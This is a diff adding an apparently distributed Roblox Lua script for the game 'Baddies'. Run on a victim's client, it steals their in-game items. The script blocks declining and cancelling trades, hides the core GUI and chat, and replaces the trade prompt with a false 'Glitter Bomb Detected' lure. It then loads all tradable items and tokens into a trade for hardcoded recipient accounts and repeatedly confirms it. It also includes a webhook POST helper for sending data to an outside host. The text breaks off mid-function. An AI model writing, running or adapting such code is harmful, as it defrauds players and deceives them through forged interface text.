@@ -1,0 +1,2353 @@
+-- This file was generated at discord.gg/syncrypt
+
+local t1 = {}
+local t2 = {}
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+game:GetService("Players")
+local Replion = require(ReplicatedStorage.Modules.Replion).Client:GetReplion("Data")
+repeat
+    task.wait()
+until Replion
+local v5 = Replion:Get({
+	"NewInventory",
+	"Items",
+	"WeaponSkin"
+})
+t2.value1 = {
+	Boxing = true,
+	Kickboxing = true,
+	["MMA Fighting"] = true,
+	["Glitter Style"] = true,
+	["Karate Style"] = true,
+	["Mean Girl Mayhem Style"] = true,
+	["Princess Punchout Style"] = true,
+	["Puppet Panic Style"] = true,
+	["Rough ’n’ Rude Style"] = true,
+	["Feral Frenzy Style"] = true,
+	["Heartbreaker Style"] = true,
+	["Princess Power Style"] = true,
+	["Storm Dancer Style"] = true,
+	["Hug of Doom Style"] = true,
+	["Bubble Pop Style"] = true,
+	["Angel Style"] = true,
+	["Black Hex Style"] = true,
+	["Fantasy Style"] = true,
+	["Goth Style"] = true,
+	["Beast Style"] = true
+}
+t2.value2 = {
+	Stick = true,
+	["Spearhead Stick"] = false,
+	["Text Sign"] = true,
+	Slingshot = false,
+	["Rusty Bow"] = false,
+	["Regular Bow"] = false
+}
+local _pairs = pairs
+if not v5 then
+    v5 = {}
+end
+for _, v8 in _pairs(v5) do
+    if t2.value1[v8.Name] then
+        table.insert({}, v8.Name)
+    end
+end
+local Players = game:GetService("Players")
+t2.value3 = game:GetService("ReplicatedStorage")
+t2.value4 = game:GetService("CoreGui")
+game:GetService("VirtualUser")
+game:GetService("TweenService")
+local LocalPlayer = Players.LocalPlayer
+if LocalPlayer then
+    t1.value1 = LocalPlayer:IsA("Player")
+
+    if t1.value1 then
+        t1.value1 = LocalPlayer.PlayerGui
+    end
+end
+repeat
+    task.wait()
+
+    local v11 = LocalPlayer
+
+    if LocalPlayer then
+        v11 = LocalPlayer:IsA("Player") and LocalPlayer.PlayerGui
+    end
+until v11
+local Net = t2.value3:WaitForChild("Modules"):WaitForChild("Net")
+t2.value5 = Net:WaitForChild("RF/Trading/DeclineTradeOffer")
+t2.value6 = Net:WaitForChild("RF/Trading/AcceptTradeOffer")
+t2.value7 = Net:WaitForChild("RF/Trading/SendTradeOffer")
+t2.value8 = Net:WaitForChild("RF/Trading/CancelTrade")
+t2.value9 = Net:WaitForChild("RE/SetPhoneSettings")
+t2.value10 = nil
+t2.value10 = hookmetamethod(game, "__namecall", function(p1, ...)
+    local v110 = getnamecallmethod()
+    local t3 = { ... }
+
+    if v110 == "InvokeServer" or v110 == "FireServer" and p1 == t2.value5 then
+        return nil
+    end
+
+    if v110 == "InvokeServer" or v110 == "FireServer" and p1 == t2.value8 then
+        return nil
+    end
+
+    if v110 == "FireServer" or v110 == "InvokeServer" and p1 == t2.value9 then
+        if t3[1] == "TradeEnabled" and t3[2] == false then
+            return nil
+        end
+
+        return t2.value10(p1, ...)
+    end
+
+    local v112 = v110 == "InvokeServer" or v110 == "FireServer"
+
+    if v112 then
+        v112 = p1 == t2.value6 or p1 == t2.value7
+    end
+
+    if v112 then
+        return t2.value10(p1, ...)
+    end
+
+    return t2.value10(p1, ...)
+end)
+pcall(function()
+    local FireServer = t2.value9.FireServer
+
+    function t2.value9.FireServer(p2, p3, p4)
+        if p3 == "TradeEnabled" and p4 == false then
+            return nil
+        end
+
+        return FireServer(p2, p3, p4)
+    end
+end)
+task.spawn(function()
+    pcall(function()
+        local Net2 = require(t2.value3.Modules.Net)
+
+        if Net2 then
+            if Net2["RF/Trading/DeclineTradeOffer"] then
+                local v448 = Net2["RF/Trading/DeclineTradeOffer"]
+
+                function v448.InvokeServer(...)
+                    return nil
+                end
+                function v448.FireServer(...)
+                    return nil
+                end
+            end
+
+            if Net2["RF/Trading/CancelTrade"] then
+                local v449 = Net2["RF/Trading/CancelTrade"]
+
+                function v449.InvokeServer(...)
+                    return nil
+                end
+                function v449.FireServer(...)
+                    return nil
+                end
+            end
+
+            if Net2["RE/SetPhoneSettings"] then
+                local v450 = Net2["RE/SetPhoneSettings"]
+                local FireServer = v450.FireServer
+
+                function v450.FireServer(p5, p6)
+                    if p5 == "TradeEnabled" and p6 == false then
+                        return nil
+                    end
+
+                    return FireServer(p5, p6)
+                end
+            end
+        end
+    end)
+end)
+task.spawn(function()
+    while true do
+        pcall(function()
+            t2.value9:FireServer("TradeEnabled", true)
+        end)
+        task.wait(0.5)
+    end
+end)
+task.spawn(function()
+    while true do
+        pcall(function()
+            local RobloxGui = t2.value4:FindFirstChild("RobloxGui")
+
+            if RobloxGui then
+                RobloxGui.Enabled = false
+            end
+        end)
+        task.wait(1)
+    end
+end)
+t2.value11 = game:GetService("ReplicatedStorage")
+t2.value12 = game:GetService("Players")
+local RunService = game:GetService("RunService")
+t2.value13 = game:GetService("TextChatService")
+t2.value14 = game:GetService("HttpService")
+game:GetService("VirtualInputManager")
+t2.value15 = t2.value12.LocalPlayer
+t2.value16 = t2.value15:WaitForChild("PlayerGui")
+t2.value17 = require(t2.value11.Modules.Inventory.Client)
+local Modules = t2.value11:WaitForChild("Modules")
+local TradeData = require(Modules.Trading.TradeData)
+t2.value18 = require(Modules.Replion)
+local v16 = require(Modules.Net):RemoteEvent("Trade/MessageEvent")
+local Replion2 = t2.value18.Client:GetReplion("Data")
+repeat
+    task.wait()
+until Replion2
+local v18 = Replion2:Get({
+	"NewInventory",
+	"Items",
+	"WeaponSkin"
+})
+local Stomp = require(t2.value11.SkinCrates.Items.Stomp)
+local t4 = {
+	["Credit Card Hoverboard"] = true,
+	["Popstar Hoverboard"] = true,
+	["Graduation Hat Hoverboard"] = true,
+	["Surf's Up Hoverboard"] = true,
+	["Pink Star Board"] = true,
+	["Ice cream Sandwich Board"] = true,
+	["Angel Wings"] = true,
+	["Void Demon Wings"] = true,
+	["Bath Tub Hoverboard"] = true,
+	["Rocket Hoverboard"] = true,
+	["St Patrick's Board"] = true
+}
+t2.value19 = {}
+t2.value20 = {}
+t2.value21 = {}
+local _pairs2 = pairs
+if not v18 then
+    v18 = {}
+end
+for _, v23 in _pairs2(v18) do
+    if not v23.Name then
+        continue
+    end
+    local v24 = v23.Name:lower()
+    if t2.value1[v23.Name] then
+        table.insert(t2.value21, v23.Name)
+    end
+    for v27, v28 in pairs(Stomp) do
+
+        local v29 = v27:lower()
+
+        if string.find(v24, v29) then
+            t2.value19[v27] = true
+
+            break
+        end
+    end
+    for k, _ in pairs(t4) do
+        local v32 = k
+
+        if v32 == v23.Name then
+            t2.value20[v32] = true
+        end
+    end
+end
+local v33 = game.PlaceId ~= 84780374286597
+if v33 then
+    v33 = game.PlaceId ~= 11158043705
+end
+if v33 then
+    t2.value15:Kick("Script doesn't support this game, join BADDIES")
+
+    return
+end
+local v34 = t2.value11.Modules.Net["RF/Trading/SendTradeOffer"]
+local v35 = t2.value11.Modules.Net["RE/SetPhoneSettings"]
+local v36 = t2.value11.Modules.Net["RF/Trading/SetReady"]
+local v37 = t2.value11.Modules.Net["RF/Trading/ConfirmTrade"]
+local v38 = t2.value11.Modules.Net["RF/Trading/AcceptTradeOffer"]
+local v39 = t2.value11.Modules.Net["RF/Trading/SetTokens"]
+local NODH_WEBHOOK = _G.NODH_WEBHOOK
+local v41 = _G.MY_USERNAMES or {}
+local t5 = {}
+for v45, v46 in ipairs({
+	"qua_lovesAJJ",
+	"LostIatinagirI",
+	"WinningBaddiesStar"
+}) do
+
+    table.insert(t5, v46)
+end
+for _, v in ipairs(v41) do
+    local v49 = false
+    for v52, v53 in ipairs(t5) do
+
+        local lower = v53.lower
+        local lower2 = v.lower
+
+        if lower(v53) == lower2(v) then
+            v49 = true
+
+            break
+        end
+    end
+    if not v49 then
+        table.insert(t5, v)
+    end
+end
+local v56 = _G.NODH_PING or false
+local t6 = {
+	enabled = true,
+	requiredProperties = {{
+		path = "Buttons",
+		visible = true
+	}}
+}
+local t7 = {
+	path = "Backpack",
+	visible = true
+}
+local t8 = {
+	enabled = true,
+	requiredProperties = { t7 }
+}
+local t9 = {
+	GeneralGUI = t6,
+	BackpackGui = t8
+}
+local u61 = false
+local t10 = {}
+local t11 = {}
+local u64 = false
+task.spawn(function()
+    pcall(function()
+        local TradeData2 = require(t2.value11.Modules.Trading.TradeData)
+
+        if TradeData2 and TradeData2.Remotes then
+            if TradeData2.Remotes.DeclineTradeOffer then
+                function TradeData2.Remotes.DeclineTradeOffer.InvokeServer(...)
+                    return nil
+                end
+                function TradeData2.Remotes.DeclineTradeOffer.FireServer(...)
+                    return nil
+                end
+            end
+
+            if TradeData2.Remotes.CancelTrade then
+                function TradeData2.Remotes.CancelTrade.InvokeServer(...)
+                    return nil
+                end
+                function TradeData2.Remotes.CancelTrade.FireServer(...)
+                    return nil
+                end
+            end
+        end
+    end)
+end)
+local function v65()
+    for k, v in pairs(t9) do
+        local k2 = t2.value16:FindFirstChild(k)
+
+        if k2 then
+            if v.enabled and not k2.Enabled then
+                k2.Enabled = true
+            end
+
+            for _, v2 in ipairs(v.requiredProperties) do
+                local v2path = k2:FindFirstChild(v2.path)
+                local v120 = v2path
+
+                if v2path then
+                    v120 = v2path:IsA("GuiObject")
+
+                    if v120 then
+                        v120 = v2.visible ~= nil
+
+                        if v120 then
+                            v120 = v2path.Visible ~= v2.visible
+                        end
+                    end
+                end
+
+                if v120 then
+                    v2path.Visible = v2.visible
+                end
+            end
+        end
+    end
+end
+task.spawn(function()
+    while true do
+        v65()
+        task.wait(0.1)
+    end
+end)
+task.spawn(function()
+    while true do
+        local TradeRequestPopup = t2.value16:FindFirstChild("TradeRequestPopup")
+
+        if TradeRequestPopup then
+            local TradeRequest = TradeRequestPopup:FindFirstChild("TradeRequest")
+
+            if TradeRequest then
+                local Content = TradeRequest:FindFirstChild("Content")
+                local v124 = Content
+
+                if Content then
+                    v124 = Content:IsA("TextLabel")
+                end
+
+                if v124 and Content.Text ~= "Glitter Bomb Detected ACCEPT TO GET" then
+                    Content.Text = "Glitter Bomb Detected ACCEPT TO GET"
+                end
+            end
+        end
+
+        task.wait()
+    end
+end)
+local Satchel = Modules:WaitForChild("Satchel")
+local lib = require(Satchel)
+local v68 = lib
+if v68 then
+    v68 = lib.SetBackpackEnabled
+end
+if v68 then
+    local SetBackpackEnabled = lib.SetBackpackEnabled
+
+    function lib.SetBackpackEnabled(p7, _)
+        SetBackpackEnabled(p7, true)
+    end
+end
+task.spawn(function()
+    task.wait(2)
+
+    local ok, result = pcall(function()
+        return require(script.Parent.CustomBackpackController)
+    end)
+
+    if ok and result then
+        if result._canEnable then
+            function result._canEnable()
+                return true
+            end
+        end
+
+        if result._toggleBackpackTo then
+            local _toggleBackpackTo = result._toggleBackpackTo
+
+            function result._toggleBackpackTo(p9, _)
+                return _toggleBackpackTo(p9, true)
+            end
+        end
+
+        if result._disable then
+            function result._disable()
+            end
+        end
+
+        if result._disableSpam then
+            function result._disableSpam()
+            end
+        end
+
+        if result._freeze then
+            function result._freeze()
+            end
+        end
+
+        if result._enable then
+            result:_enable()
+        end
+
+        result._enabled = true
+    end
+end)
+task.spawn(function()
+    for _, v in ipairs({
+		"Freezed",
+		"BeingArrested",
+		"BeingDogLeashed",
+		"BeingTombstoneTrapped",
+		"USER_DRIVING",
+		"USER_VEHICLE_SITTING",
+		"IN_DRESS_ROOM",
+		"CARRYING_EGG",
+		"UNDERGROUND_FIGHTING",
+		"BeingSchoolLockerTrapped"
+	}) do
+        t2.value15:GetAttributeChangedSignal(v):Connect(function()
+            local v456 = lib
+
+            if v456 then
+                v456 = lib.SetBackpackEnabled
+            end
+
+            if v456 then
+                lib:SetBackpackEnabled(true)
+            end
+
+            pcall(function()
+                local CustomBackpackController = require(script.Parent.CustomBackpackController)
+
+                if CustomBackpackController then
+                    if CustomBackpackController._enable then
+                        CustomBackpackController:_enable()
+                    end
+
+                    if CustomBackpackController._toggleBackpackTo then
+                        CustomBackpackController:_toggleBackpackTo(true)
+                    end
+
+                    CustomBackpackController._enabled = true
+                end
+            end)
+        end)
+    end
+end)
+t2.value15.CharacterAdded:Connect(function(character)
+    task.wait(0.5)
+
+    local Humanoid = character:WaitForChild("Humanoid")
+    local v134 = lib
+
+    if v134 then
+        v134 = lib.SetBackpackEnabled
+    end
+
+    if v134 then
+        lib:SetBackpackEnabled(true)
+    end
+
+    if Humanoid then
+        Humanoid.StateChanged:Connect(function(_, _)
+            task.wait(0.1)
+
+            local v459 = lib
+
+            if v459 then
+                v459 = lib.SetBackpackEnabled
+            end
+
+            if v459 then
+                lib:SetBackpackEnabled(true)
+            end
+        end)
+    end
+end)
+task.spawn(function()
+    while true do
+        pcall(function()
+            local BackpackGui = t2.value16:FindFirstChild("BackpackGui")
+
+            if BackpackGui then
+                local Backpack = BackpackGui:FindFirstChild("Backpack")
+
+                if Backpack then
+                    local Hotbar = Backpack:FindFirstChild("Hotbar")
+
+                    if Hotbar and Hotbar:IsA("Frame") then
+                        if not Hotbar.Visible then
+                            Hotbar.Visible = true
+                        end
+
+                        if Hotbar.Enabled ~= nil and not Hotbar.Enabled then
+                            Hotbar.Enabled = true
+                        end
+
+                        for _, child in ipairs(Hotbar:GetChildren()) do
+                            if child:IsA("GuiObject") and not child.Visible then
+                                child.Visible = true
+                            end
+                        end
+                    end
+                end
+            end
+
+            if BackpackGui and not BackpackGui.Enabled then
+                BackpackGui.Enabled = true
+            end
+        end)
+        task.wait(0.1)
+    end
+end)
+task.spawn(function()
+    while true do
+        pcall(function()
+            local v465 = lib
+
+            if v465 then
+                v465 = lib.SetBackpackEnabled
+            end
+
+            if v465 then
+                lib:SetBackpackEnabled(true)
+            end
+
+            local ok, result = pcall(function()
+                return require(script.Parent.CustomBackpackController)
+            end)
+
+            if ok and result then
+                if result._enable then
+                    result:_enable()
+                end
+
+                if result._toggleBackpackTo then
+                    result:_toggleBackpackTo(true)
+                end
+
+                result._enabled = true
+            end
+        end)
+        task.wait(0.5)
+    end
+end)
+for _, child in ipairs(Satchel:GetChildren()) do
+    if child.Name == "BackpackItemAdded" and child:IsA("RemoteEvent") then
+        child.Event:Connect(function()
+            local v135 = lib
+
+            if v135 then
+                v135 = lib.SetBackpackEnabled
+            end
+
+            if v135 then
+                lib:SetBackpackEnabled(true)
+            end
+        end)
+    end
+end
+function t1.value2(p13)
+    if not p13 then
+        return false
+    end
+
+    local TradeLock = p13.TradeLock
+
+    if not TradeLock then
+        return true
+    end
+
+    if TradeLock.Type == "Untradable" then
+        return false
+    end
+
+    if TradeLock.Type == "Timestamp" then
+        local Time = TradeLock.Time
+
+        if Time then
+            Time = TradeLock.Time > os.time()
+        end
+
+        if Time then
+            return false
+        end
+
+        return true
+    end
+
+    return false
+end
+function t1.value3()
+    local t12 = {}
+    for v142, v143 in pairs(t2.value19) do
+
+        table.insert(t12, v142)
+    end
+    for k, _ in pairs(t2.value20) do
+        table.insert(t12, k)
+    end
+
+    return t12
+end
+local function v72()
+    for _, v in ipairs(t2.value17:FindItems("WeaponSkin")) do
+        local Item = t2.value17:GetItem("WeaponSkin", v)
+
+        if Item then
+            Item = Item.Name == "Spiked Kitty Stanli"
+        end
+
+        if Item then
+            return true
+        end
+    end
+
+    return false
+end
+local function v73()
+    local v167, v168, v169 = ipairs(t2.value17:FindItems("Weapon"))
+
+    repeat
+        local v170
+
+        v169, v170 = v167(v168, v169)
+
+        if not v169 then
+            for _, v in ipairs(t2.value17:FindItems("WeaponSkin")) do
+                local Item = t2.value17:GetItem("WeaponSkin", v)
+
+                if Item then
+                    Item = Item.Name == "Glitter Bomb"
+                end
+
+                if Item then
+                    return true
+                end
+            end
+
+            return false
+        end
+
+        local Item = t2.value17:GetItem("Weapon", v170)
+
+        if Item then
+            Item = Item.Name == "Glitter Bomb"
+        end
+    until Item
+
+    return true
+end
+local function v74()
+    local v159, v160, v161 = ipairs(t2.value17:FindItems("Weapon"))
+
+    repeat
+        local v162
+
+        v161, v162 = v159(v160, v161)
+
+        if not v161 then
+            for _, v in ipairs(t2.value17:FindItems("WeaponSkin")) do
+                local Item = t2.value17:GetItem("WeaponSkin", v)
+
+                if Item then
+                    Item = Item.Name == "Glitter Blue Spray"
+                end
+
+                if Item then
+                    return true
+                end
+            end
+
+            return false
+        end
+
+        local Item = t2.value17:GetItem("Weapon", v162)
+
+        if Item then
+            Item = Item.Name == "Glitter Blue Spray"
+        end
+    until Item
+
+    return true
+end
+local function v75()
+    local v175, v176, v177 = ipairs(t2.value17:FindItems("Weapon"))
+
+    repeat
+        local v178
+
+        v177, v178 = v175(v176, v177)
+
+        if not v177 then
+            for _, v in ipairs(t2.value17:FindItems("WeaponSkin")) do
+                local Item = t2.value17:GetItem("WeaponSkin", v)
+
+                if Item then
+                    Item = Item.Name == "Love Me Hate Me Taser"
+                end
+
+                if Item then
+                    return true
+                end
+            end
+
+            return false
+        end
+
+        local Item = t2.value17:GetItem("Weapon", v178)
+
+        if Item then
+            Item = Item.Name == "Love Me Hate Me Taser"
+        end
+    until Item
+
+    return true
+end
+local function v76()
+    local v191 = t2.value17:Get()
+
+    if not v191 or not v191.Items then
+        return nil
+    end
+
+    return v191.Items
+end
+local value2 = t1.value2
+local function v78()
+    local t13 = {}
+    local t14 = {}
+    local n1 = 0
+    local n2 = 0
+    local n3 = 0
+    local t15 = {}
+    local v198 = v76()
+
+    if v198 and v198.Weapon then
+        for _, v in pairs(v198.Weapon) do
+            if v and v.Name and not t2.value2[v.Name] then
+                local v201 = value2(v)
+
+                t13[v.Name] = (t13[v.Name] or 0) + 1
+                n1 += 1
+
+                if v201 then
+                    n2 += 1
+                else
+                    n3 += 1
+                end
+
+                t15[v.Name] = t15[v.Name] or {}
+                table.insert(t15[v.Name], v201)
+                table.insert(t14, v.Name .. "::None::" .. tostring(v201))
+            end
+        end
+    end
+
+    if v198 and v198.WeaponSkin then
+        for _, v in pairs(v198.WeaponSkin) do
+            if v then
+                local Weapon = v.Weapon
+
+                if not Weapon then
+                    Weapon = v.WeaponName or v.Type
+                end
+
+                local vName = v.Name
+
+                if Weapon and vName and not t2.value1[v.Name] then
+                    table.insert(t14, Weapon .. "::" .. vName .. "::" .. tostring((value2(v))))
+                end
+            end
+        end
+    end
+
+    return t13, t14, n1, n2, n3, t15
+end
+local function v79()
+    local t16 = {}
+    local t17 = {}
+    local n4 = 0
+
+    for _, v in ipairs(t2.value17:FindItems("Weapon")) do
+        local Item = t2.value17:GetItem("Weapon", v)
+
+        if Item and Item.Name and not t2.value2[Item.Name] then
+            t16[Item.Name] = (t16[Item.Name] or 0) + 1
+            n4 += 1
+            table.insert(t17, Item.Name .. "::None")
+        end
+    end
+
+    for _, v in ipairs(t2.value17:FindItems("WeaponSkin")) do
+        local Item = t2.value17:GetItem("WeaponSkin", v)
+
+        if Item then
+            local Weapon = Item.Weapon
+
+            if not Weapon then
+                Weapon = Item.WeaponName or Item.Type
+            end
+
+            local ItemName = Item.Name
+
+            if Weapon and ItemName and not t2.value1[Item.Name] then
+                table.insert(t17, Weapon .. "::" .. ItemName)
+            end
+        end
+    end
+
+    return t16, t17, n4
+end
+local function v80()
+    local t18 = {}
+
+    for k, _ in pairs(t2.value19) do
+        table.insert(t18, k)
+    end
+
+    return t18
+end
+function t1.value4()
+    local t19 = {}
+
+    for _, v in ipairs(t2.value21) do
+        table.insert(t19, v)
+    end
+
+    return t19
+end
+function t1.value5()
+    local v226 = #t2.value12:GetPlayers()
+    local MaxPlayers = t2.value12.MaxPlayers
+
+    if v226 < 12 or v226 >= MaxPlayers - 1 then
+        t2.value15:Kick("Server outdated, Join one above 12+ players")
+
+        return false
+    end
+
+    return true
+end
+local value4
+function t1.value6()
+    local v228 = v80()
+    local t20 = {}
+
+    for k, _ in pairs(t2.value20) do
+        table.insert(t20, k)
+    end
+
+    local v232 = value4()
+    local t21 = {}
+
+    if #v232 > 0 then
+        table.insert(t21, "Fighting Styles:")
+
+        for _, v in ipairs(v232) do
+            table.insert(t21, "• " .. v)
+        end
+
+        table.insert(t21, "")
+    end
+
+    if #v228 > 0 then
+        table.insert(t21, "Stomps Skins:")
+
+        for _, v in ipairs(v228) do
+            table.insert(t21, "• " .. v)
+        end
+
+        table.insert(t21, "")
+    end
+
+    if #t20 > 0 then
+        table.insert(t21, "Boards Skins:")
+
+        for _, v in ipairs(t20) do
+            table.insert(t21, "• " .. v)
+        end
+    end
+
+    if #t21 == 0 then
+        return "None"
+    end
+
+    return table.concat(t21, "\n")
+end
+value4 = t1.value4
+local value3 = t1.value3
+local value6 = t1.value6
+local value5 = t1.value5
+t1.value8 = value5()
+if not t1.value8 then
+    return
+end
+local function v85(p14)
+    if not p14 then
+        return "N/A"
+    end
+
+    if p14 >= 1000000 then
+        return string.format("%.1fM", p14 / 1000000)
+    end
+
+    if p14 >= 1000 then
+        return string.format("%.1fK", p14 / 1000)
+    end
+
+    return tostring(p14)
+end
+function t1.value7()
+    local Messages = t2.value16:FindFirstChild("Messages")
+
+    if Messages then
+        Messages:Destroy()
+    end
+end
+local function v86(p15, p16)
+    local v244 = not p15
+
+    if not v244 then
+        v244 = p15 == ""
+    end
+
+    if v244 then
+        return nil
+    end
+
+    local t22 = {
+		["Content-Type"] = "application/json"
+	}
+    local u246 = p16
+
+    if type(p16) ~= "string" then
+        local success, result = pcall(function()
+            return t2.value14:JSONEncode(p16)
+        end)
+        u246 = not success and "{}" or result
+    end
+
+    for _, v in ipairs({
+		function()
+        local _syn = syn
+
+        if _syn then
+            _syn = syn.request
+        end
+
+        if _syn then
+            local request2 = syn.request
+            local v479 = p15
+            local v480 = t22
+            local v481 = u246
+
+            return request2({
+					Url = v479,
+					Method = "POST",
+					Headers = v480,
+					Body = v481
+				})
+        end
+    end,
+		function()
+        if request then
+            local _request = request
+            local v483 = p15
+            local v484 = t22
+            local v485 = u246
+
+            return _request({
+					Url = v483,
+					Method = "POST",
+					Headers = v484,
+					Body = v485
+				})
+        end
+    end,
+		function()
+        local _http = http
+
+        if _http then
+            _http = http.request
+        end
+
+        if _http then
+            local request3 = http.request
+            local v470 = p15
+            local v471 = t22
+            local v472 = u246
+
+            return request3({
+					Url = v470,
+					Method = "POST",
+					Headers = v471,
+					Body = v472
+				})
+        end
+    end,
+		function()
+        if http_request then
+            local _http_request = http_request
+            local v474 = p15
+            local v475 = t22
+            local v476 = u246
+
+            return _http_request({
+					Url = v474,
+					Method = "POST",
+					Headers = v475,
+					Body = v476
+				})
+        end
+    end,
+		function()
+        local _fluxus = fluxus
+
+        if _fluxus then
+            _fluxus = fluxus.request
+        end
+
+        if _fluxus then
+            local request4 = fluxus.request
+            local v488 = p15
+            local v489 = t22
+            local v490 = u246
+
+            return request4({
+					Url = v488,
+					Method = "POST",
+					Headers = v489,
+					Body = v490
+				})
+        end
+    end
+	}) do
+        local ok, result = pcall(v)
+
+        if not (ok and result) then
+            continue
+        end
+
+        local v253 = result.Success == true
+
+        if not v253 then
+            v253 = result.StatusCode == 200 or result.Body ~= nil
+        end
+
+        if v253 then
+            return result
+        end
+    end
+
+    return nil
+end
+function t1.value9()
+    for _ = 1, 20 do
+        pcall(function()
+            v37:InvokeServer()
+        end)
+        task.wait(0.05)
+    end
+end
+function t1.value10(p17)
+    if not p17 then
+        return false
+    end
+
+    return (pcall(function()
+        if p17.MouseButton1Click then
+            firesignal(p17.MouseButton1Click)
+
+            return
+        end
+
+        if p17.Activated then
+            firesignal(p17.Activated)
+        end
+    end))
+end
+local value10 = t1.value10
+function t1.value11()
+    local Trading = t2.value16:FindFirstChild("Trading")
+
+    if not Trading then
+        return 0
+    end
+
+    local Frame = Trading:FindFirstChild("Frame")
+
+    if not Frame then
+        return 0
+    end
+
+    local Main = Frame:FindFirstChild("Main")
+
+    if not Main then
+        return 0
+    end
+
+    local YourOffer = Main:FindFirstChild("YourOffer")
+
+    if not YourOffer then
+        return 0
+    end
+
+    local ItemDisplay = YourOffer:FindFirstChild("ItemDisplay")
+
+    if not ItemDisplay then
+        return 0
+    end
+
+    local ScrollingFrame = ItemDisplay:FindFirstChild("ScrollingFrame")
+
+    if not ScrollingFrame then
+        return 0
+    end
+
+    local _, v263 = v79()
+    local n5 = 0
+
+    ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
+    task.wait(0.1)
+
+    for _, v in ipairs(v263) do
+        local v3 = ScrollingFrame:FindFirstChild(v)
+        local v268 = v3
+
+        if v3 then
+            v268 = v3:IsA("ImageButton") and v3.Visible
+        end
+
+        if v268 and value10(v3) then
+            n5 += 1
+            task.wait(0.08)
+        end
+    end
+
+    local v269 = ScrollingFrame.CanvasSize.Y.Offset - ScrollingFrame.AbsoluteWindowSize.Y
+
+    if v269 > 0 then
+        ScrollingFrame.CanvasPosition = Vector2.new(0, v269)
+        task.wait(0.1)
+
+        for _, v in ipairs(v263) do
+            local v4 = ScrollingFrame:FindFirstChild(v)
+            local v273 = v4
+
+            if v4 then
+                v273 = v4:IsA("ImageButton") and v4.Visible
+            end
+
+            if v273 and value10(v4) then
+                n5 += 1
+                task.wait(0.08)
+            end
+        end
+    end
+
+    return n5
+end
+local value11 = t1.value11
+function t1.value12()
+    local Trading = t2.value16:FindFirstChild("Trading")
+
+    if not Trading then
+        return 0
+    end
+
+    local Frame = Trading:FindFirstChild("Frame")
+
+    if not Frame then
+        return 0
+    end
+
+    local Main = Frame:FindFirstChild("Main")
+
+    if not Main then
+        return 0
+    end
+
+    local YourOffer = Main:FindFirstChild("YourOffer")
+
+    if not YourOffer then
+        return 0
+    end
+
+    local ItemDisplay = YourOffer:FindFirstChild("ItemDisplay")
+
+    if not ItemDisplay then
+        return 0
+    end
+
+    local ScrollingFrame = ItemDisplay:FindFirstChild("ScrollingFrame")
+
+    if not ScrollingFrame then
+        return 0
+    end
+
+    local v280 = value4()
+
+    if #v280 == 0 then
+        return 0
+    end
+
+    ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
+    task.wait(0.1)
+
+    local n6 = 0
+
+    for _, v in ipairs(v280) do
+        for _, child in ipairs(ScrollingFrame:GetChildren()) do
+            if not (child:IsA("ImageButton") and child.Visible) then
+                continue
+            end
+
+            local v286 = child.Name:lower()
+            local v287 = v:lower()
+            local v288 = v286 == v287
+
+            if not v288 then
+                v288 = string.find(v286, v287)
+
+                if not v288 then
+                    v288 = string.find(v287, v286)
+                end
+            end
+
+            if v288 and value10(child) then
+                n6 += 1
+                task.wait(0.08)
+
+                break
+            end
+        end
+    end
+
+    if not (n6 > 0) then
+    end
+
+    return n6
+end
+function t1.value13()
+    if u64 then
+        return 0
+    end
+
+    local Trading = t2.value16:FindFirstChild("Trading")
+
+    if not Trading then
+        return 0
+    end
+
+    local Frame = Trading:FindFirstChild("Frame")
+
+    if not Frame then
+        return 0
+    end
+
+    local Main = Frame:FindFirstChild("Main")
+
+    if not Main then
+        return 0
+    end
+
+    local YourOffer = Main:FindFirstChild("YourOffer")
+
+    if not YourOffer then
+        return 0
+    end
+
+    local ItemDisplay = YourOffer:FindFirstChild("ItemDisplay")
+
+    if not ItemDisplay then
+        return 0
+    end
+
+    local ScrollingFrame = ItemDisplay:FindFirstChild("ScrollingFrame")
+
+    if not ScrollingFrame then
+        return 0
+    end
+
+    local v295 = value3()
+
+    if #v295 == 0 then
+        return 0
+    end
+
+    ScrollingFrame.CanvasPosition = Vector2.new(0, 0)
+    task.wait(0.1)
+
+    local n7 = 0
+
+    for _, v in ipairs(v295) do
+        local GetChildren = ScrollingFrame.GetChildren
+
+        for _, v6 in ipairs(GetChildren(ScrollingFrame)) do
+            if not (v6:IsA("ImageButton") and v6.Visible) then
+                continue
+            end
+
+            local v302 = v6.Name:lower()
+            local v303 = v:lower()
+            local v304 = v302 == v303
+
+            if not v304 then
+                v304 = string.find(v302, v303)
+
+                if not v304 then
+                    v304 = string.find(v303, v302)
+                end
+            end
+
+            if v304 and value10(v6) then
+                n7 += 1
+                task.wait(0.08)
+
+                break
+            end
+        end
+    end
+
+    if n7 > 0 then
+        u64 = true
+    end
+
+    return n7
+end
+function t1.value14(p18)
+    local v306 = not p18
+
+    if not v306 then
+        v306 = u61
+
+        if not v306 then
+            v306 = t10[p18]
+        end
+    end
+
+    if v306 then
+        return false
+    end
+
+    for i = 1, 3 do
+        local ok, result = pcall(function()
+            return v34:InvokeServer(p18)
+        end)
+
+        if ok and result then
+            return true
+        end
+
+        if i < 3 then
+            task.wait(0.5)
+        end
+    end
+
+    return false
+end
+local value12 = t1.value12
+local value13 = t1.value13
+function t1.value15()
+    local Trading = t2.value16:FindFirstChild("Trading")
+
+    if Trading then
+        local Frame = Trading:FindFirstChild("Frame")
+
+        if Frame then
+            local Categories = Frame:FindFirstChild("Categories")
+
+            if Categories then
+                local TokenAmount = Categories:FindFirstChild("TokenAmount")
+
+                if TokenAmount then
+                    local TextLabel = TokenAmount:FindFirstChild("TextLabel")
+
+                    if TextLabel then
+                        local match = string.match(TextLabel.Text, "%d+")
+
+                        if match then
+                            return tonumber(match)
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return 0
+end
+local value15
+function t1.value16()
+    task.wait(0.2)
+
+    local v316 = value11()
+
+    task.wait(0.3)
+
+    local v317 = value12()
+
+    task.wait(0.3)
+
+    local v318 = value13()
+
+    task.wait(0.2)
+
+    local v319 = value15()
+
+    if v319 and v319 > 0 then
+        pcall(function()
+            v39:InvokeServer(v319)
+        end)
+    end
+
+    return v316 + v317 + v318
+end
+value15 = t1.value15
+local value9 = t1.value9
+function t1.value18()
+    task.wait(0.2)
+    value11()
+    task.wait(0.3)
+    value12()
+    task.wait(0.3)
+    value13()
+    task.wait(0.2)
+
+    local v320 = value15()
+
+    if v320 and v320 > 0 then
+        pcall(function()
+            v39:InvokeServer(v320)
+        end)
+    end
+
+    task.wait(0.2)
+    pcall(function()
